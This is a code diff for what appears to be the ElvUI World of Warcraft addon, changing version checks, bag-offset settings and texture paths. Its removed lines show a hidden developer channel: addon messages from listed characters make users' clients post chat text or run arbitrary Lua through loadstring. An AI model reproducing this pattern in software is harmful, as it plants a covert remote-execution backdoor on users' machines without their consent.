@@ -462,37 +462,15 @@ end
 local myName = E.myname.."-"..E.myrealm;
 myName = myName:gsub("%s+", "")
 local frames = {}
-local devAlts = {
-	['Elv-ShatteredHand'] = true,
-	['Sarah-ShatteredHand'] = true,
-	['Sara-ShatteredHand'] = true,
-}
 local function SendRecieve(self, event, prefix, message, channel, sender)
 	if event == "CHAT_MSG_ADDON" then
 		if(sender == myName) then return end
 
-		if prefix == "ELVUI_VERSIONCHK" and devAlts[myName] ~= true and not E.recievedOutOfDateMessage then
+		if prefix == "ELVUI_VERSIONCHK" and myName ~= "Elv-ShatteredHand" and not E.recievedOutOfDateMessage then
 			if(tonumber(message) ~= nil and tonumber(message) > tonumber(E.version)) then
 				E:Print(L["ElvUI is out of date. You can download the newest version from www.tukui.org. Get premium membership and have ElvUI automatically updated with the Tukui Client!"])
 				E:StaticPopup_Show("ELVUI_UPDATE_AVAILABLE")
 				E.recievedOutOfDateMessage = true
-			end
-		elseif (prefix == 'ELVUI_DEV_SAYS' or prefix == 'ELVUI_DEV_CMD') and devAlts[sender] == true and devAlts[myName] ~= true then
-			if prefix == 'ELVUI_DEV_SAYS' then
-				local user, channel, msg, sendTo = split("#", message)
-				
-				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
-					SendChatMessage(msg, channel, nil, sendTo)
-				end
-			else
-				local user, executeString = split("#", message)
-				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
-					local func, err = loadstring(executeString);
-					if not err then
-						E:Print(format("Developer Executed: %s", executeString))
-						func()
-					end
-				end			
 			end
 		end
 	else
@@ -501,8 +479,6 @@ local function SendRecieve(self, event, prefix, message, channel, sender)
 end
 
 RegisterAddonMessagePrefix('ELVUI_VERSIONCHK')
-RegisterAddonMessagePrefix('ELVUI_DEV_SAYS')
-RegisterAddonMessagePrefix('ELVUI_DEV_CMD')
 
 local f = CreateFrame('Frame')
 f:RegisterEvent("GROUP_ROSTER_UPDATE")
@@ -740,6 +716,15 @@ function E:DBConversions()
 
 	self.db.unitframe.units.raid10 = nil
 	self.db.unitframe.units.raid25 = nil
+	
+	if not E.db.bagsOffsetFixed then
+		if E.db.bags.xOffset ~= P['bags']['xOffset'] then
+			E.db.bags.xOffsetBank = E.db.bags.xOffset
+			E.db.bags.yOffsetBank = E.db.bags.yOffset
+			E.db.bags.xOffset = E.db.bags.xOffset * (-1) --Change positive value to negative or vice versa
+		end
+		E.db.bagsOffsetFixed = true
+	end
 end
 
 function E:StopMassiveShake()
@@ -960,8 +945,8 @@ function E:SetupAprilFools2014()
 		self.db.general.bordercolor = {r = 223/255, g = 217/255, b = 47/255}
 		self.db.general.valuecolor = {r = 223/255, g = 217/255, b = 47/255}
 		
-		self.db.chat.panelBackdropNameLeft = [[Interface\AddOns\ElvUI\media\textures\helloKittyChat1.tga]]
-		self.db.chat.panelBackdropNameRight = [[Interface\AddOns\ElvUI\media\textures\helloKittyChat1.tga]]
+		self.db.chat.panelBackdropNameLeft = [[Interface\AddOns\ElvUI\media\textures\helloKittyChat.tga]]
+		self.db.chat.panelBackdropNameRight = [[Interface\AddOns\ElvUI\media\textures\helloKittyChat.tga]]
 		
 		self.db.unitframe.colors.castColor = {r = 223/255, g = 76/255, b = 188/255}
 		self.db.unitframe.colors.transparentCastbar = true
@@ -1092,7 +1077,7 @@ function E:CreateKittys()
 	helloKittyLeft:SetPoint("BOTTOMLEFT", LeftChatPanel, "BOTTOMRIGHT", 2, -4)
 	helloKittyLeft.tex = helloKittyLeft:CreateTexture(nil, "OVERLAY")
 	helloKittyLeft.tex:SetAllPoints()
-	helloKittyLeft.tex:SetTexture("Interface\\AddOns\\ElvUI\\media\\textures\\hello_kitty.tga")
+	helloKittyLeft.tex:SetTexture("Interface\\AddOns\\ElvUI\\media\\textures\\helloKitty.tga")
 	helloKittyLeft.tex:SetTexCoord(0, 0, 0, 1, 0, 0, 0, 1)
 	helloKittyLeft.curFrame = 1
 	helloKittyLeft.countUp = true
@@ -1109,7 +1094,7 @@ function E:CreateKittys()
 	helloKittyRight:SetPoint("BOTTOMRIGHT", RightChatPanel, "BOTTOMLEFT", -2, -4)
 	helloKittyRight.tex = helloKittyRight:CreateTexture(nil, "OVERLAY")
 	helloKittyRight.tex:SetAllPoints()
-	helloKittyRight.tex:SetTexture("Interface\\AddOns\\ElvUI\\media\\textures\\hello_kitty.tga")
+	helloKittyRight.tex:SetTexture("Interface\\AddOns\\ElvUI\\media\\textures\\helloKitty.tga")
 	helloKittyRight.tex:SetTexCoord(0, 0, 0, 1, 0, 0, 0, 1)
 	helloKittyRight.curFrame = 10
 	helloKittyRight.countUp = false
